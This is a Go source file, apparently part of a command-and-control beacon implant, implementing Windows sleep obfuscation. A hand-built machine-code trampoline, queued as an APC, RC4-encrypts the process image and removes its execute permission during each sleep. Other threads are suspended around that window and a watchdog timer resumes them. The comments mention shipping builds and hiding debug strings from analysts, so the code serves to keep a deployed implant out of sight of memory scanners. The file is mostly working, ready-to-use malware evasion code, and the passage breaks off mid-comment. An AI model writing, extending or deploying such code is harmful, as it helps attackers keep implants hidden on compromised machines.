// Package apc implements sleep obfuscation via a QueueUserAPC-driven
// encrypt/sleep/decrypt sequence running on the beacon's own thread,
// with a minimal peer-thread suspension pass around it to prevent Go
// runtime threads from faulting on the encrypted image.
//
// Design summary
//
// This replaces the older Ekko-based sleep obfuscation, which was
// fundamentally incompatible with Go's runtime. See the claude_ekko
// branch and the postmortem in that commit history for the details.
//
// The core encrypt-sleep-decrypt cycle runs from a hand-written amd64
// trampoline placed in a VirtualAlloc'd RWX region OUTSIDE the process
// image. Because the trampoline sits in a separate allocation and only
// calls into ntdll/kernel32/advapi32 (never back into the encrypted Go
// .text), it runs cleanly through the encrypted window on the same
// thread that queued it as an APC.
//
// BUT: with the image un-executable, any OTHER Go M (sysmon,
// netpoller, GC worker, timer callback) that happens to fetch an
// instruction from .text during the encrypted window will AV and take
// the process down. That is the crash we saw on the first attempt at
// this design without any peer-thread management.
//
// Fix: before entering the alertable wait, snapshot threads and
// SuspendThread every image-based peer, then briefly delay to let the
// kernel commit the suspensions before the trampoline touches memory.
// After the wait returns, ResumeThread each peer (draining any
// accumulated suspend count from Go's own async-preemption).
//
// We deliberately do NOT do the things that made Ekko fragile:
//   - No CreateTimerQueue / NtContinue ROP hijack — everything runs
//     as a single APC on our own thread.
//   - No GetThreadContext after SuspendThread — that call has no
//     timeout and hung whenever a target was suspended mid-kernel-
//     transition. We replace it with a fixed short NtDelayExecution.
//   - No repeated Ekko-style syscall churn per peer — just one
//     SuspendThread and one ResumeThread(-drain) each, per cycle.
//
// See the claude_ekko postmortem for why each of the above matters.
package apc

import (
	"crypto/rand"
	"errors"
	"fmt"
	"runtime"
	"sync/atomic"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	pageReadWrite        uintptr = 0x04
	pageExecuteReadWrite uintptr = 0x40

	memCommit  uintptr = 0x1000
	memReserve uintptr = 0x2000
	memRelease uintptr = 0x8000

	// NtQueryInformationThread information class for the thread's
	// user-mode start address (used to filter peer threads to only those
	// that started inside our image — i.e. Go runtime Ms, not thread-pool
	// workers or third-party threads).
	threadQuerySetWin32StartAddress uintptr = 0x9

	// NtQueryInformationThread information class returning the current
	// kernel suspend count as a ULONG. Undocumented-but-stable; present
	// since Windows 10 1607. Lets us READ the suspend count without
	// perturbing it (no Suspend/Resume race introduced by the check).
	// Buffer size = 4 bytes.
	threadSuspendCount uintptr = 0x23

	// Milliseconds to sleep between the suspend pass and the APC.
	// SuspendThread is asynchronous; the kernel needs a moment to commit
	// each suspension. GetThreadContext would block until commit but has
	// no timeout — we use a fixed short delay instead.
	commitDelayMs int64 = 5

	// ResumeThread drain cap. Bumped from 32 to 1024 after we observed a
	// hang whose signature was "peer Ms permanently OS-suspended with
	// near-zero CPU time." One hypothesis is that Go's sysmon and any
	// other concurrent-suspend source (a security product, kernel worker,
	// etc.) can race harder with our own SuspendThread than 32 iterations
	// covers. 1024 is well below MAXIMUM_SUSPEND_COUNT (0x7F) times any
	// realistic race count and still a bounded runaway backstop.
	maxResumeDrain = 1024

	// apcDebug gates OutputDebugStringA probes throughout this package.
	// Set to false and rebuild before shipping — the probe format strings
	// live in .rdata and are trivially discoverable with `strings`.
	apcDebug = true

	// Watchdog: a one-shot Windows thread-pool timer that fires from a
	// TppWorkerThread if the Sleep cycle doesn't complete in the expected
	// time. See ANALYSIS.md for the full theory — briefly, the beacon can
	// deadlock in Go's exitsyscall after any LazyProc.Call because our
	// SuspendThread can freeze the M holding our P. The watchdog runs on
	// a thread we never suspend (TppWorker start address is in ntdll,
	// filtered out of our image-based suspension set), so it can always
	// fire and rescue us by force-resuming peers.
	//
	// Margin over the intended sleep duration before the watchdog fires.
	// Sized generously — real Sleep cycles complete within sleepMs +
	// small overhead, so anything past sleepMs + margin means we're
	// wedged.
	watchdogMarginMs = 15000

	// WT_EXECUTEONLYONCE: this timer fires exactly once and self-deletes.
	// From Windows headers.
	wtExecuteOnlyOnce = 0x00000008

	// DWORD (uint32) representation of -1, cast to uintptr. SuspendThread
	// and ResumeThread return DWORD; on failure they return (DWORD)-1
	// which zero-extends to 0x00000000FFFFFFFF in a 64-bit register, NOT
	// 0xFFFFFFFFFFFFFFFF.
	dwordMinusOne uintptr = 0xFFFFFFFF
)

var (
	kernel32             = syscall.NewLazyDLL("kernel32.dll")
	procGetModuleHandleA = kernel32.NewProc("GetModuleHandleA")
	procVirtualAlloc     = kernel32.NewProc("VirtualAlloc")
	procVirtualFree      = kernel32.NewProc("VirtualFree")
	procVirtualProtect   = kernel32.NewProc("VirtualProtect")
	procQueueUserAPC     = kernel32.NewProc("QueueUserAPC")
	procSuspendThread    = kernel32.NewProc("SuspendThread")
	procResumeThread     = kernel32.NewProc("ResumeThread")
	procOutputDebugStringA = kernel32.NewProc("OutputDebugStringA")

	procCreateTimerQueueTimer = kernel32.NewProc("CreateTimerQueueTimer")
	procDeleteTimerQueueTimer = kernel32.NewProc("DeleteTimerQueueTimer")

	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
	procNtDelayExecution         = ntdll.NewProc("NtDelayExecution")
	procNtWaitForSingleObject  = ntdll.NewProc("NtWaitForSingleObject")
	procNtQueryInformationThread = ntdll.NewProc("NtQueryInformationThread")

	advapi32              = syscall.NewLazyDLL("Advapi32.dll")
	procSystemFunction032 = advapi32.NewProc("SystemFunction032")
)

// Cumulative counters. Exposed via Stats(). No behavior changes based on them.
var (
	cyclesTotal atomic.Uint64
	errorsTotal atomic.Uint64
)

// Stats returns (cycles, errors) counters since process start. Useful for
// beacon telemetry to detect a host on which APC-based sleep is failing.
func Stats() (cycles, errors uint64) {
	return cyclesTotal.Load(), errorsTotal.Load()
}

// dbg emits a line to any attached debugger (DbgView with global capture,
// WinDbg, etc.) via OutputDebugStringA. Silently dropped by the kernel
// when no debugger is present, so cheap in normal operation — but the
// format strings live in .rdata, so gate at compile time (apcDebug=false)
// before shipping.
func dbg(format string, args ...any) {
	if !apcDebug {
		return
	}
	msg := fmt.Sprintf("[apc] "+format+"\n", args...)
	p, err := windows.BytePtrFromString(msg)
	if err != nil {
		return
	}
	procOutputDebugStringA.Call(uintptr(unsafe.Pointer(p)))
	runtime.KeepAlive(p)
}

// ustring matches the informal SystemFunction032 argument type
// (ULONG Length, ULONG MaximumLength, PVOID Buffer). It is used as the
// data-and-key descriptor for the in-place RC4 encryption.
type ustring struct {
	Length        uint32
	MaximumLength uint32
	Buffer        uintptr
}

// imageNTHeaders64Prefix is enough of IMAGE_NT_HEADERS64 to read SizeOfImage.
// Field order is exactly the PE spec; alignment matches natural layout.
type imageNTHeaders64Prefix struct {
	Signature uint32
	// IMAGE_FILE_HEADER (20 bytes)
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
	// IMAGE_OPTIONAL_HEADER64 (partial)
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
}

// apcArgs is the struct passed to the trampoline via QueueUserAPC's dwData.
//
// FIELD OFFSETS ARE HARD-CODED IN THE TRAMPOLINE MACHINE CODE. Do not
// reorder, resize, or insert fields without also updating the trampoline
// AND the init-time offset assertion below. A mismatch would produce a
// silent crash inside the encrypted window (unrecoverable).
type apcArgs struct {
	imageBase        uintptr // 0x00
	imageSize        uintptr // 0x08
	oldProt          uint32  // 0x10  (VirtualProtect out-param)
	_pad             uint32  // 0x14  (alignment to 8 for the ustring below)
	img              ustring // 0x18  (16 bytes)
	key              ustring // 0x28  (16 bytes)
	delayInterval    int64   // 0x38  (100-ns units, negative = relative)
	virtualProtect   uintptr // 0x40
	systemFunc032    uintptr // 0x48
	ntDelayExecution uintptr // 0x50
}

// trampoline is hand-written amd64 machine code invoked as a
// QueueUserAPC callback. On entry, RCX points to an apcArgs struct.
//
// Sequence (each call preserves RBX per Windows x64 ABI):
//
//	VirtualProtect(base, size, PAGE_READWRITE,          &oldProt)
//	SystemFunction032(&img, &key)                          // RC4 encrypt
//	NtDelayExecution(FALSE, &delayInterval)                // sleep
//	SystemFunction032(&img, &key)                          // RC4 decrypt (symmetric)
//	VirtualProtect(base, size, PAGE_EXECUTE_READWRITE,  &oldProt)
//	ret
//
// Byte-for-byte annotated:
var trampoline = []byte{
	// Prologue: save RBX, reserve 48 bytes (32 shadow + 16 spare).
	// Entry Rsp % 16 == 8 (call pushed 8-byte ret addr); after push rbx
	// it becomes 0; after sub rsp, 0x30 it stays 0 — properly aligned
	// for the calls that follow.
	0x53,                   // push rbx
	0x48, 0x83, 0xEC, 0x30, // sub rsp, 0x30
	0x48, 0x89, 0xCB,       // mov rbx, rcx           ; rbx = args ptr

	// VirtualProtect(base, size, PAGE_READWRITE, &oldProt)
	0x48, 0x8B, 0x4B, 0x00,             // mov rcx, [rbx+0x00]
	0x48, 0x8B, 0x53, 0x08,             // mov rdx, [rbx+0x08]
	0x41, 0xB8, 0x04, 0x00, 0x00, 0x00, // mov r8d, 0x04
	0x4C, 0x8D, 0x4B, 0x10,             // lea r9,  [rbx+0x10]
	0xFF, 0x53, 0x40,                   // call qword ptr [rbx+0x40]

	// SystemFunction032(&img, &key) -- encrypt
	0x48, 0x8D, 0x4B, 0x18, // lea rcx, [rbx+0x18]
	0x48, 0x8D, 0x53, 0x28, // lea rdx, [rbx+0x28]
	0xFF, 0x53, 0x48,       // call qword ptr [rbx+0x48]

	// NtDelayExecution(FALSE, &delayInterval)
	// Non-alertable: no other APCs can slip in between encrypt and decrypt.
	0x33, 0xC9,             // xor ecx, ecx
	0x48, 0x8D, 0x53, 0x38, // lea rdx, [rbx+0x38]
	0xFF, 0x53, 0x50,       // call qword ptr [rbx+0x50]

	// SystemFunction032(&img, &key) -- decrypt (RC4 is symmetric)
	0x48, 0x8D, 0x4B, 0x18, // lea rcx, [rbx+0x18]
	0x48, 0x8D, 0x53, 0x28, // lea rdx, [rbx+0x28]
	0xFF, 0x53, 0x48,       // call qword ptr [rbx+0x48]

	// VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &oldProt)
	0x48, 0x8B, 0x4B, 0x00,             // mov rcx, [rbx+0x00]
	0x48, 0x8B, 0x53, 0x08,             // mov rdx, [rbx+0x08]
	0x41, 0xB8, 0x40, 0x00, 0x00, 0x00, // mov r8d, 0x40
	0x4C, 0x8D, 0x4B, 0x10,             // lea r9,  [rbx+0x10]
	0xFF, 0x53, 0x40,                   // call qword ptr [rbx+0x40]

	// Epilogue
	0x48, 0x83, 0xC4, 0x30, // add rsp, 0x30
	0x5B,                   // pop rbx
	0xC3,                   // ret
}

func init() {
	// Resolve every Windows procedure we call at startup so a bad symbol
	// name fails loudly here instead of panicking on the first Sleep().
	// Learned the hard way — an "NtWaitForSingleObjectEx" typo (that
	// function does not exist in ntdll; the Ex suffix is Win32-only)
	// produced a silent 2-second crash on the first sleep cycle.
	for _, p := range []*syscall.LazyProc{
		procGetModuleHandleA, procVirtualAlloc, procVirtualFree,
		procVirtualProtect, procQueueUserAPC, procSuspendThread, procResumeThread,
		procOutputDebugStringA,
		procCreateTimerQueueTimer, procDeleteTimerQueueTimer,
		procNtDelayExecution, procNtWaitForSingleObject, procNtQueryInformationThread,
		procSystemFunction032,
	} {
		if err := p.Find(); err != nil {
			panic(fmt.Sprintf("apc: cannot resolve %s: %v", p.Name, err))
		}
	}

	// Pre-create the watchdog callback trampoline exactly once — NewCallback
	// allocates from a per-process pool that we don't want to churn every
	// Sleep cycle.
	watchdogCallbackPtr = syscall.NewCallback(watchdogFire)

	// The trampoline references apcArgs fields by hard-coded byte offset.
	// Fail loudly at startup if Go's struct layout has drifted from what
	// the machine code expects — a mismatch here would produce a silent
	// crash inside the encrypted window at first Sleep() call.
	var a apcArgs
	mustOffset("imageBase",        unsafe.Offsetof(a.imageBase),        0x00)
	mustOffset("imageSize",        unsafe.Offsetof(a.imageSize),        0x08)
	mustOffset("oldProt",          unsafe.Offsetof(a.oldProt),          0x10)
	mustOffset("img",              unsafe.Offsetof(a.img),              0x18)
	mustOffset("key",              unsafe.Offsetof(a.key),              0x28)
	mustOffset("delayInterval",    unsafe.Offsetof(a.delayInterval),    0x38)
	mustOffset("virtualProtect",   unsafe.Offsetof(a.virtualProtect),   0x40)
	mustOffset("systemFunc032",    unsafe.Offsetof(a.systemFunc032),    0x48)
	mustOffset("ntDelayExecution", unsafe.Offsetof(a.ntDelayExecution), 0x50)
}

func mustOffset(name string, got, want uintptr) {
	if got != want {
		panic(fmt.Sprintf("apc: apcArgs.%s at offset 0x%X, expected 0x%X (trampoline drift)", name, got, want))
	}
}

// healResidualSuspends is a self-healing sweep that runs at the very top
// of every Sleep cycle. It enumerates image-based peer threads and, for
// each one, READS the current kernel suspend count via
// NtQueryInformationThread(ThreadSuspendCount) — a query that does NOT
// mutate the count. If any thread has residual suspensions from prior
// cycles (leaked by whatever race is at play in the Go-runtime /
// Windows sysmon / our SuspendThread interaction), we drain them to
// zero here before doing anything else.
//
// The critical property: this uses a QUERY, not a Suspend+Resume probe,
// so it introduces no new race with sysmon's async preemption. It is
// purely additive to the existing flow.
//
// Overhead in the steady state (no residue found): one Toolhelp
// snapshot, one OpenThread + one NtQueryInformationThread + one
// CloseHandle per peer. On a typical Go beacon this is 5-6 syscalls
// per cycle — unmeasurable in practice.
func healResidualSuspends(currentTID uint32, imageBase, imageEnd uintptr) {
	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return
	}
	defer windows.CloseHandle(hSnapshot)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	if err := windows.Thread32First(hSnapshot, &te); err != nil {
		return
	}

	currentPID := uint32(windows.GetCurrentProcessId())
	healed := 0
	scanned := 0

	for {
		if te.OwnerProcessID == currentPID && te.ThreadID != currentTID {
			hThread, openErr := windows.OpenThread(
				windows.THREAD_SUSPEND_RESUME|windows.THREAD_QUERY_INFORMATION,
				false, te.ThreadID,
			)
			if openErr == nil {
				// Filter to image-based threads (same rule as suspend pass).
				var startAddr, retLen uintptr
				procNtQueryInformationThread.Call(
					uintptr(hThread),
					threadQuerySetWin32StartAddress,
					uintptr(unsafe.Pointer(&startAddr)),
					unsafe.Sizeof(startAddr),
					uintptr(unsafe.Pointer(&retLen)),
				)
				if startAddr >= imageBase && startAddr < imageEnd {
					scanned++

					// READ the suspend count. This does NOT change it.
					var suspCount uint32
					var qRetLen uintptr
					status, _, _ := procNtQueryInformationThread.Call(
						uintptr(hThread),
						threadSuspendCount,
						uintptr(unsafe.Pointer(&suspCount)),
						unsafe.Sizeof(suspCount),
						uintptr(unsafe.Pointer(&qRetLen)),
					)

					if status == 0 && suspCount > 0 {
						// Residual suspension detected. Drain it.
						drainCalls := 0
						var lastR uintptr
						for i := uint32(0); i < uint32(maxResumeDrain); i++ {
							r, _, _ := procResumeThread.Call(uintptr(hThread))
							drainCalls++
							lastR = r
							if r == 0 || r == 1 || r == dwordMinusOne {
								break
							}
						}
						healed++
						dbg("heal tid=%d preSuspCount=%d drainCalls=%d lastR=%d",
							te.ThreadID, suspCount, drainCalls, lastR)
					}
				}
				windows.CloseHandle(hThread)
			}
		}

		if err := windows.Thread32Next(hSnapshot, &te); err != nil {
			break
		}
	}

	if healed > 0 {
		dbg("heal summary scanned=%d healed=%d", scanned, healed)
	}
}

// suspendImagePeers enumerates every thread in the current process whose
// user-mode start address falls inside our image (i.e. Go runtime Ms —
// sysmon, netpoller, GC workers, other beacon goroutines' Ms), skips the
// calling thread, and calls SuspendThread on the rest. Returns the list
// of TIDs actually suspended so they can be resumed one-for-one later.
//
// We DO NOT call GetThreadContext after SuspendThread — that syscall
// blocks until the kernel commits the suspension and has no timeout,
// which was the source of one of the Ekko-era hangs. Instead, callers
// should NtDelayExecution briefly after this returns to let the
// suspensions commit before touching memory the peers may be reading.
func suspendImagePeers(currentTID uint32, imageBase, imageEnd uintptr) ([]uint32, error) {
	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(hSnapshot)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	if err := windows.Thread32First(hSnapshot, &te); err != nil {
		return nil, err
	}

	currentPID := uint32(windows.GetCurrentProcessId())
	suspended := make([]uint32, 0, 32)

	for {
		if te.OwnerProcessID == currentPID && te.ThreadID != currentTID {
			hThread, openErr := windows.OpenThread(
				windows.THREAD_SUSPEND_RESUME|windows.THREAD_QUERY_INFORMATION,
				false, te.ThreadID,
			)
			if openErr == nil {
				var startAddr, retLen uintptr
				procNtQueryInformationThread.Call(
					uintptr(hThread),
					threadQuerySetWin32StartAddress,
					uintptr(unsafe.Pointer(&startAddr)),
					unsafe.Sizeof(startAddr),
					uintptr(unsafe.Pointer(&retLen)),
				)
				if startAddr >= imageBase && startAddr < imageEnd {
					r, _, _ := procSuspendThread.Call(uintptr(hThread))
					if r != dwordMinusOne {
						suspended = append(suspended, te.ThreadID)
					}
				}
				windows.CloseHandle(hThread)
			}
		}
		if err := windows.Thread32Next(hSnapshot, &te); err != nil {
			break
		}
	}
	return suspended, nil
}

// resumePeers iterates the TID list produced by suspendImagePeers and
// resumes each one, DRAINING the suspend count with a bounded loop.
// Go's sysmon can independently suspend the same M as part of async
// preemption; if it does so while our own SuspendThread is in effect,
// the counter can exceed 1 and a single ResumeThread call would leave
// the thread stuck. Draining until ResumeThread returns 1 (was last
// suspension) or 0 (wasn't suspended) fixes that.
//
// The `cycle` argument is only used for debug probes; passing 0 is fine
// when the caller doesn't have a cycle number to report.
//
// DIAGNOSTIC MODE: this build logs every case that isn't "single Resume
// call returned 1" — including openThread failures, ResumeThread
// returning -1 (error), and any drain that took more than one iteration.
// Previous silent-break logic was hiding the actual failure mode: on the
// last run, four peer Ms (including Go's netpoller) ended up permanently
// suspended with no drain messages, which is only possible if
// ResumeThread was returning -1 on the very first call and the drain
// loop broke without logging.
func resumePeers(cycle uint64, tids []uint32) {
	// Log the TID list so we can correlate leaks against specific peers.
	dbg("cycle=%d resume begin tids=%v", cycle, tids)

	failures := 0
	for _, tid := range tids {
		hThread, err := windows.OpenThread(windows.THREAD_SUSPEND_RESUME, false, tid)
		if err != nil {
			failures++
			dbg("cycle=%d tid=%d OPEN_FAIL err=%v", cycle, tid, err)
			continue
		}

		// Drain the suspend count. We track the sequence of return values
		// so if we break early we can report EXACTLY why.
		var lastR uintptr
		var lastErr error
		drainCalls := 0
		for i := 0; i < maxResumeDrain; i++ {
			r, _, callErr := procResumeThread.Call(uintptr(hThread))
			drainCalls++
			lastR = r
			lastErr = callErr
			if r == 0 {
				// Was not suspended when we called Resume.
				break
			}
			if r == 1 {
				// Was suspended exactly once; now fully resumed.
				break
			}
			if r == dwordMinusOne {
				// ResumeThread FAILED. This is the silent path that was
				// hiding leaks in prior builds.
				failures++
				dbg("cycle=%d tid=%d RESUME_FAIL r=-1 err=%v drainCalls=%d",
					cycle, tid, callErr, drainCalls)
				break
			}
			// r > 1: still suspended, keep draining.
		}

		// Log any non-trivial drain (2+ Resume calls) or a cap hit.
		if drainCalls >= 2 {
			tag := ""
			if drainCalls == maxResumeDrain && lastR > 1 && lastR != dwordMinusOne {
				tag = " CAP_HIT_STILL_SUSPENDED"
				failures++
			}
			dbg("cycle=%d tid=%d DRAIN calls=%d lastR=%d lastErr=%v%s",
				cycle, tid, drainCalls, lastR, lastErr, tag)
		}

		windows.CloseHandle(hThread)
	}

	if failures > 0 {
		dbg("cycle=%d resume end failures=%d (peers may still be suspended)", cycle, failures)
	}
}

// watchdogArgs is the state passed to the watchdog callback. Heap-allocated
// per Sleep call. The `fired` flag tells the Sleep caller whether the
// watchdog actually rescued us or was cancelled unfired.
//
// Kept intentionally tiny — the callback dereferences these fields from
// a thread-pool worker context and we don't want any pointer chasing.
type watchdogArgs struct {
	currentTID uint32
	_pad       uint32
	imageBase  uintptr
	imageEnd   uintptr
	fired      atomic.Bool
	resumed    atomic.Int32
}

// watchdogCallbackPtr is the pre-resolved Go->C trampoline that the
// Windows thread-pool timer invokes. Created once at package init so we
// don't leak a NewCallback allocation per Sleep cycle.
var watchdogCallbackPtr uintptr

// watchdogFire runs on a TppWorkerThread (Windows thread-pool worker)
// when the timer expires. Its entire job is to break a P-handoff
// deadlock in Sleep by force-resuming every image-based peer.
//
// Called with (lpParameter uintptr, TimerOrWaitFired uintptr) per the
// WaitOrTimerCallback signature. We only use the first argument.
//
// This runs on a thread whose start address is inside ntdll (not our
// image), so it is NEVER captured by suspendImagePeers' filter and can
// always execute — even when every Go M is suspended.
//
// Extra Ms created by Go for foreign-thread callbacks do not own a P,
// so their entersyscall/exitsyscall does not participate in the same
// P-handoff race that traps the main Sleep goroutine. That is why the
// watchdog can safely make LazyProc.Call syscalls (OpenThread,
// ResumeThread, NtQueryInformationThread) that would otherwise be a
// vector for the very race we're rescuing from.
func watchdogFire(lpParameter uintptr, _ uintptr) uintptr {
	args := (*watchdogArgs)(unsafe.Pointer(lpParameter))
	args.fired.Store(true)
	dbg("WATCHDOG FIRED - force-resuming image-based peers")

	hSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		dbg("WATCHDOG snapshot err=%v", err)
		return 0
	}
	defer windows.CloseHandle(hSnap)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	if err := windows.Thread32First(hSnap, &te); err != nil {
		return 0
	}

	currentPID := uint32(windows.GetCurrentProcessId())
	resumed := int32(0)

	for {
		if te.OwnerProcessID == currentPID && te.ThreadID != args.currentTID {
			hThread, oerr := windows.OpenThread(
				windows.THREAD_SUSPEND_RESUME|windows.THREAD_QUERY_INFORMATION,
				false, te.ThreadID,
			)
			if oerr == nil {
				// Filter to image-based threads (same rule as suspend pass).
				var startAddr, retLen uintptr
				procNtQueryInformationThread.Call(
					uintptr(hThread),
					threadQuerySetWin32StartAddress,
					uintptr(unsafe.Pointer(&startAddr)),
					unsafe.Sizeof(startAddr),
					uintptr(unsafe.Pointer(&retLen)),
				)
				if startAddr >= args.imageBase && startAddr < args.imageEnd {
					// Drain-resume: keep calling ResumeThread until the
					// previous count was 0, 1, or an error. Idempotent —
					// threads that were already resumed just return 0.
					for i := 0; i < maxResumeDrain; i++ {
						r, _, _ := procResumeThread.Call(uintptr(hThread))
						if r == 0 || r == 1 || r == dwordMinusOne {
							break
						}
					}
					resumed++
				}
				windows.CloseHandle(hThread)
			}
		}
		if err := windows.Thread32Next(hSnap, &te); err != nil {
			break
		}
	}

	args.resumed.Store(resumed)
	dbg("WATCHDOG done resumed=%d", resumed)
	return 0
}

// Sleep obfuscates the current process image for sleepMs milliseconds.
//
// See the package-level comment for the overall design. The important
// invariants for correctness are:
//
//   - runtime.LockOSThread pins the beacon goroutine to this M for the
//     entire duration, so the APC we queue is guaranteed to land on the
//     same thread that enters the alertable wait.
//   - The trampoline lives in a fresh VirtualAlloc'd RWX region that is
//     NOT part of the process image, so it survives the encryption pass.
//   - The trampoline never calls back into Go .text; every function it
//     invokes lives in ntdll / kernel32 / advapi32.
//   - The apcArgs struct is heap-allocated (escape analysis lifts it out
//     of the goroutine stack because we pass its address to unmanaged
//     code) so the trampoline can dereference it after we return control
//     to the alertable wait.
func Sleep(sleepMs uint64) error {
	if sleepMs == 0 {
		return nil
	}
	cycle := cyclesTotal.Add(1)
	dbg("cycle=%d enter Sleep sleepMs=%d cyclesTotal=%d errors=%d",
		cycle, sleepMs, cycle, errorsTotal.Load())

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Image base and size — needed to know what to encrypt.
	imageBase, _, _ := procGetModuleHandleA.Call(0)
	if imageBase == 0 {
		errorsTotal.Add(1)
		return errors.New("apc: GetModuleHandleA returned NULL")
	}
	eLfaNew := *((*uint32)(unsafe.Pointer(imageBase + 0x3c)))
	nt := (*imageNTHeaders64Prefix)(unsafe.Pointer(imageBase + uintptr(eLfaNew)))
	imageSize := uintptr(nt.SizeOfImage)

	// Fresh RC4 key per cycle.
	var keyBuf [16]byte
	if _, err := rand.Read(keyBuf[:]); err != nil {
		errorsTotal.Add(1)
		return err
	}

	// Allocate the trampoline OUTSIDE the image mapping so that when the
	// image is encrypted the trampoline's own code is unaffected.
	tramp, _, _ := procVirtualAlloc.Call(
		0,
		uintptr(len(trampoline)),
		memCommit|memReserve,
		pageExecuteReadWrite,
	)
	if tramp == 0 {
		errorsTotal.Add(1)
		return errors.New("apc: VirtualAlloc for trampoline failed")
	}
	defer procVirtualFree.Call(tramp, 0, memRelease)

	copy(
		unsafe.Slice((*byte)(unsafe.Pointer(tramp)), len(trampoline)),
		trampoline,
	)

	// Heap-allocated args — pointer given to unmanaged code, so escape
	// analysis promotes it to the heap and stack moves cannot invalidate
	// the pointer while the APC is in flight.
	args := &apcArgs{
		imageBase: imageBase,
		imageSize: imageSize,
		img: ustring{
			Length:        uint32(imageSize),
			MaximumLength: uint32(imageSize),
			Buffer:        imageBase,
		},
		key: ustring{
			Length:        uint32(len(keyBuf)),
			MaximumLength: uint32(len(keyBuf)),
			Buffer:        uintptr(unsafe.Pointer(&keyBuf[0])),
		},
		// 100-ns units, negative sign = relative delay.
		delayInterval:    -int64(sleepMs) * 10_000,
		virtualProtect:   procVirtualProtect.Addr(),
		systemFunc032:    procSystemFunction032.Addr(),
		ntDelayExecution: procNtDelayExecution.Addr(),
	}

	// Real handle to self. The pseudo-handle from GetCurrentThread works
	// with QueueUserAPC in practice but is not documented as guaranteed;
	// take the safe path.
	currentTID := windows.GetCurrentThreadId()
	hSelf, err := windows.OpenThread(
		windows.THREAD_SET_CONTEXT|windows.THREAD_QUERY_INFORMATION,
		false,
		currentTID,
	)
	if err != nil {
		errorsTotal.Add(1)
		return err
	}
	defer windows.CloseHandle(hSelf)

	// -------- SUSPEND PEER GO Ms --------
	// The trampoline is about to strip the image's execute bit and encrypt
	// it. Any other thread that fetches an instruction from .text during
	// that window (Go's sysmon fires every ~20 ms; netpoller and GC
	// workers wake on demand) would AV and take the whole process down.
	// Freeze them for the duration of the cycle. All Go heap allocations
	// above this line have already run; below it we only make Windows
	// syscalls, so a suspended peer can't be holding a Go runtime lock
	// that we then wait on.
	imageEnd := imageBase + imageSize

	// Self-heal any residual suspensions from prior cycles before we do
	// anything else. See healResidualSuspends() docs for the theory of
	// operation.
	healResidualSuspends(currentTID, imageBase, imageEnd)

	suspendedTIDs, err := suspendImagePeers(currentTID, imageBase, imageEnd)
	if err != nil {
		errorsTotal.Add(1)
		dbg("cycle=%d suspendImagePeers err=%v", cycle, err)
		return err
	}
	dbg("cycle=%d suspend done tids=%d currentTID=%d", cycle, len(suspendedTIDs), currentTID)

	// ARM THE WATCHDOG.
	// Everything below this point may deadlock in Go's exitsyscall if a
	// suspended M is holding the P we release when we entersyscall. The
	// watchdog fires from a thread-pool worker (which we never suspend)
	// after sleepMs + watchdogMarginMs and force-resumes every image-based
	// peer, breaking any such deadlock. If Sleep completes normally we
	// cancel it below.
	wdArgs := &watchdogArgs{
		currentTID: currentTID,
		imageBase:  imageBase,
		imageEnd:   imageEnd,
	}
	watchdogTimeoutMs := sleepMs + watchdogMarginMs
	if watchdogTimeoutMs > 0x7FFFFFFF {
		watchdogTimeoutMs = 0x7FFFFFFF // CreateTimerQueueTimer's DueTime is DWORD
	}
	var hWatchdogTimer uintptr
	wdRet, _, _ := procCreateTimerQueueTimer.Call(
		uintptr(unsafe.Pointer(&hWatchdogTimer)),
		0, // NULL timer queue = default process-wide queue
		watchdogCallbackPtr,
		uintptr(unsafe.Pointer(wdArgs)),
		uintptr(watchdogTimeoutMs),
		0, // Period = 0 (one-shot)
		wtExecuteOnlyOnce,
	)
	if wdRet == 0 {
		dbg("cycle=%d watchdog arm FAILED — continuing without safety net", cycle)
	}

	// SuspendThread is asynchronous — give the kernel a moment to commit
	// each suspension before we start mutating the image. Without this,
	// a peer could still be executing an in-flight instruction when we
	// begin the RC4 pass. This is the deliberate replacement for the
	// GetThreadContext-after-SuspendThread trick, which had no timeout
	// and hung in the Ekko debugging campaign.
	commitDelay := -commitDelayMs * 10_000
	procNtDelayExecution.Call(0, uintptr(unsafe.Pointer(&commitDelay)))

	// Queue the APC. It will not be delivered until this thread enters an
	// alertable wait — which happens on the very next line.
	ret, _, _ := procQueueUserAPC.Call(
		tramp,
		uintptr(hSelf),
		uintptr(unsafe.Pointer(args)),
	)
	if ret == 0 {
		// Never entered the encrypted window — safe to resume immediately
		// and bail. Failing to resume peers here would leave the process
		// deadlocked with no way out.
		dbg("cycle=%d QueueUserAPC returned 0", cycle)
		resumePeers(cycle, suspendedTIDs)
		errorsTotal.Add(1)
		return errors.New("apc: QueueUserAPC failed")
	}
	dbg("cycle=%d entering alertable wait", cycle)

	// Enter the alertable wait. The kernel notices the queued APC,
	// dispatches the trampoline (which runs the whole encrypt/sleep/
	// decrypt cycle synchronously), and returns STATUS_USER_APC when the
	// trampoline is done. We wait on the current-process handle because
	// NtWaitForSingleObject requires SOME valid handle and the process
	// handle never signals from inside the process — the wait can only
	// return via the APC completion path.
	//
	// Timeout=0 as a PLARGE_INTEGER argument means NULL, which the kernel
